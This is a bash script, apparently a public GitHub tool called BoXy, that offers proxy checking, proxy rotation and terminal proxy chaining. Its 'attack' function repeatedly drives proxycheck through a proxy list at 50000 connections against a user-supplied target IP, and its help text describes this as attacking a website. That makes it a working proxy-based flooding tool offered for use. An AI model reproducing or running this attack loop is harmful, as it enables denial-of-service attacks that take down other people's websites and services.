#!/bin/bash

# Declare Colors
COL_NORM="$(tput setaf 39)"
COL_WHITE="$(tput setaf 15)"
COL_RED="$(tput setaf 160)"
COL_GREEN="$(tput setaf 70)"
COL_BROWN="$(tput setaf 94)"
COL_BLUE="$(tput setaf 39)"
COL_BROWN="$(tput setaf 136)"

# Declare Functions
checker()
{
	if ! type "proxycheck" > /dev/null; then
		echo "[${COL_BROWN}BoXy${COL_WHITE}] It appears you are missing some dependencies, let me install them for you!"
		sudo apt-get install proxycheck
	else
		echo "[${COL_BROWN}BoXy${COL_WHITE}] Do you want to input a list or a single proxy?"
		printf "[${COL_BROWN}BoXy${COL_WHITE}] Type >> "
		read -r input_type

		if [ "$input_type" = "list" ]; then
			printf "[${COL_BROWN}BoXy${COL_WHITE}] List >> "
			read -r list
			printf "[${COL_BROWN}BoXy${COL_WHITE}] Output File >> "
			read -r output_file
			printf "[${COL_BROWN}BoXy${COL_WHITE}] Target IP >> "
			read -r target

			echo "This could take a while, get some coffee... "
			proxycheck -vv -m 50000 -d $target:80 -c chat:send:expect -i $list 2>&1 | tee src/checker/logs/log.txt
			grep "(200)" src/checker/logs/log.txt 2>&1 | tee src/checker/logs/log2.txt
			sed 's/hc://' src/checker/logs/log2.txt 2>&1 | tee src/checker/logs/log3.txt
			sed 's/: HTTP request successeful (200)//' src/checker/logs/log3.txt 2>&1 | tee $output_file
			echo "Output stored to $output_file!"

			rm src/checker/logs/log2.txt
			rm src/checker/logs/log3.txt
		elif [ "$input_type" = "single" ]; then
			printf "[${COL_BROWN}BoXy${COL_WHITE}] Host >> "
			read -r host
			printf "[${COL_BROWN}BoXy${COL_WHITE}] Port >> "
			read -r port
			printf "[${COL_BROWN}BoXy${COL_WHITE}] Target IP >> "
			read -r target

			proxycheck -vv $host:$port -c chat:send:expect -d $target:80
		else
			echo "[${COL_BROWN}BoXy${COL_WHITE}] '$input_type' wasn't an option. Make sure you typed 'list' or 'single'."
		        echo "Remember, it is case sensitive "
		fi
	fi
}

attack()
{
	if ! type "proxycheck" > /dev/null; then
		echo "[${COL_BROWN}BoXy${COL_WHITE}] It appears you are missing some dependencies, let me install them for you!"
		sudo apt-get install proxycheck
	else
		printf "[${COL_BROWN}BoXy${COL_WHITE}] Target IP >> "
		read -r target
		printf "[${COL_BROWN}BoXy${COL_WHITE}] List >> "
		read -r list
		printf "[${COL_BROWN}BoXy${COL_WHITE}] # of Iterations >> "
		read -r amount
		seq $amount | xargs -I{} proxycheck -vv -m 50000 -d "$target":80 -c chat:send:expect -i $list
	fi
}

chain()
{
	printf "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}] Proxy List >> "
	read -r list

	echo "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}] In 15 seconds most of the commands you enter in this terminal will be masked"
	echo "after every command the proxy will change."
	wait 15s
	LISTS=`cat $list` #names from names.txt file
	for line in $LISTS; do
	  printf "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_BLUE}Connecting to $line..."
	  export http_proxy="http://$line/"
	  echo "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_GREEN}You have proxy $line for your next command."
	  printf "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}] Command >> "
	  read -r cmd
	  echo $cmd > /cmd;  . /cmd
	  echo "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_GREEN}Switching proxies."
	  echo
	done
}

changer()
{
	printf "[${COL_BROWN}BoXy${COL_WHITE}] Proxy List >> "
	read -r file
	sed 's/.*://' $file 2>&1 | tee ports.txt
	sed 's/[:].*$//' $file 2>&1 | tee hosts.txt
	sh macro_scripts/clear.sh
	while read -r host && read -r port <&3; do
		printf "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_BLUE}Connecting to $host:$port..."
	 	gsettings set org.gnome.system.proxy mode 'manual' ;
		gsettings set org.gnome.system.proxy.http host "$host";
		gsettings set org.gnome.system.proxy.http port $port;
		echo "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_GREEN}You have proxy $host:$port for 1 minute"
		sleep 1m
		echo "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_RED}Connection closed..."
		echo
	done < hosts.txt 3<ports.txt
	rm hosts.txt && rm ports.txt
}

status()
{
	printf "[${COL_BROWN}BoXy${COL_WHITE}] Proxy IP >> "
	read -r proxy

	if ($( ping $proxy -4 -c1 > /dev/null )) ; then
	  echo "[${COL_BROWN}BoXy${COL_WHITE}] ${COL_GREEN}Proxy is alive, that doesn't guarantee you can use it!"
	else
	  echo "[${COL_BROWN}BoXy${COL_WHITE}] ${COL_RED}Proxy is currently dead."
	fi
}

print_info()
{
	echo "[${COL_BROWN}BoXy${COL_WHITE}] Info:"
  echo "   Author: Eclipse (https://github.com/0-Eclipse-0)"
  echo "   Version: 1.0.5"
  echo "   Creation Date: 7/14/17"
  echo "   Source: https://github.com/0-Eclipse-0/BoXy"
  echo "   System Requirements: Linux Distro w/ Gnome"
  echo "   Update Notes: Fixed program/Publicized"
}

print_help()
{
	echo "[${COL_BROWN}BoXy${COL_WHITE}] BoXy Commands Include: "
  echo "   checker - Check a list of proxies or a single proxy to see "
  echo "             if it is usable."
  echo "   changer - Change your computers proxy automatically every "
  echo "             minute using a list of proxies."
  echo "   set - Set your computer's proxy."
  echo "   status - Check to see if a proxy is alive or dead."
  echo "   chain - Change your terminal's proxy automatically once every"
  echo "           minute using a list of proxies."
  echo "   attack - Attack a website with a list of proxies."
  echo "   exit - Close BoXy."
  echo "   info - Get information about BoXy."
  echo "   help - Display a list of commands."
}

set_proxy()
{
	printf "[${COL_BROWN}BoXy${COL_WHITE}] Proxy IP >> "
	read -r host
	printf "[${COL_BROWN}BoXy${COL_WHITE}] Proxy Port >> "
	read -r port
	printf "[${COL_BROWN}BoXy${COL_WHITE}]${COL_BLUE}Connecting to $host:$port"
	gsettings set org.gnome.system.proxy mode 'manual';
	gsettings set org.gnome.system.proxy.http host "$host";
	gsettings set org.gnome.system.proxy.http port $port;
	printf "${COL_WHITE}[${COL_BROWN}BoXy${COL_WHITE}]${COL_GREEN}Proxy $host:$port set!"
	export PS1='\[\e]0;\u@\h: \w\a\]${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '
}

# Welcome Message
clear
echo "${COL_WHITE}/8888 /${COL_BROWN}8888888            /88   /88          ${COL_WHITE} /8888   "
echo "${COL_WHITE}| 88_/${COL_BROWN}| 88__  88          | 88  / 88          ${COL_WHITE}|_  88  "
echo "${COL_WHITE}| 88  ${COL_BROWN}| 88  \ 88  /888888 |  88/ 88/ /88   /88 ${COL_WHITE} | 88  "
echo "${COL_WHITE}| 88  ${COL_BROWN}| 8888888  /88__  88 \  8888/ | 88  | 88${COL_WHITE}  | 88  "
echo "${COL_WHITE}| 88  ${COL_BROWN}| 88__  88| 88  \ 88  >88  88 | 88  | 88${COL_WHITE}  | 88  "
echo "${COL_WHITE}| 88  ${COL_BROWN}| 88  \ 88| 88  | 88 /88/\  88| 88  | 88 ${COL_WHITE} | 88  "
echo "${COL_WHITE}| 8888${COL_BROWN}| 8888888/|  888888/| 88  \ 88|  8888888 ${COL_WHITE}/8888  "
echo "${COL_WHITE}|____/${COL_BROWN}|_______/  \______/ |__/  |__/ \____  88${COL_WHITE}|____/  "
echo "      ${COL_BROWN}          		     /88  | 88        "
echo "      ${COL_BROWN}                               |  888888/       "
echo "      ${COL_BROWN}            		      \______/        "
echo "     ${COL_WHITE}     [${COL_BROWN}BoXy${COL_WHITE}] :: A Box of Proxy Tools               "
echo

printf "${COL_WHITE}"
printf "[${COL_BROWN}BoXy${COL_WHITE}] Choose a tool (type 'help' for a list of tools) >> "
read -r input

if [ "$input" = "checker" ]; then
	checker
elif [ "$input" = "changer" ]; then
	changer
elif [ "$input" = "chain" ]; then
	chain
elif [ "$input" = "set" ]; then
	set_proxy
elif [ "$input" = "help" ]; then
  print_help
elif [ "$input" = "status" ]; then
	status
elif [ "$input" = "info" ]; then
  print_info
elif [ "$input" = "attack" ]; then
	attack
elif [ "$input" = "exit" ]; then
	echo "[${COL_BROWN}BoXy${COL_WHITE}] Exitting..."
	exit
else
  echo "[${COL_BROWN}BoXy${COL_WHITE}] Incorrect command! Make sure you typed the command"
  echo "correctly. It is case sensitive. Type 'help' for a list of commands!"
  sh $0
fi
